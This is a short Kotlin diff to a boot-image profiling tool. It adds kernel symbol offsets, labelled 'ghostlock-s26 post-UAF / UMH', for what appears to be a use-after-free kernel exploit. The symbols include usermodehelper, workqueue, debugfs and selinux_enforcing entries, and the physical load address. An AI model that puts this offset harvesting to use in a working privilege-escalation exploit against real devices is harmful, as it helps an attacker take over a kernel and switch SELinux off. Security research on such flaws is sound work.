@@ -101,6 +101,24 @@ object ImgToProfile {
             if (release.startsWith("6.6.")) {
                 syms["copy_process"]?.let { offset["task_alloc_link"] = it + TASK_ALLOC_INNER_OFFSET }
             }
+            // ghostlock-s26 post-UAF / UMH offsets (optional; direct symbol VAs)
+            syms["init_task"]?.let { offset["init_task"] = it }
+            syms["root_task_group"]?.let { offset["root_task_group"] = it }
+            syms["misc_list"]?.let { offset["misc_list"] = it }
+            syms["uinput_misc"]?.let { offset["uinput_misc"] = it }
+            syms["simple_attr_read"]?.let { offset["simple_attr_read"] = it }
+            syms["simple_attr_write"]?.let { offset["simple_attr_write"] = it }
+            syms["debugfs_u64_get"]?.let { offset["debugfs_u64_get"] = it }
+            syms["debugfs_u64_set"]?.let { offset["debugfs_u64_set"] = it }
+            syms["debugfs_u64_format"]?.let { offset["debugfs_u64_format"] = it }
+            syms["default_llseek"]?.let { offset["default_llseek"] = it }
+            syms["call_usermodehelper_exec_work"]?.let { offset["call_usermodehelper_exec_work"] = it }
+            syms["system_unbound_wq"]?.let { offset["system_unbound_wq"] = it }
+            syms["selinux_enforcing"]?.let { offset["selinux_enforcing_off"] = it }
+        }
+        // ghostlock-s26 physical params derivable from boot image when available
+        if (info.kernelPhysLoad != 0L) {
+            offset["phys_load"] = info.kernelPhysLoad
         }
 
         // kitimer_node = k_itimer.it 的偏移 + cpu_timer.node 的偏移（6.18=0xe0，6.6=0x78）
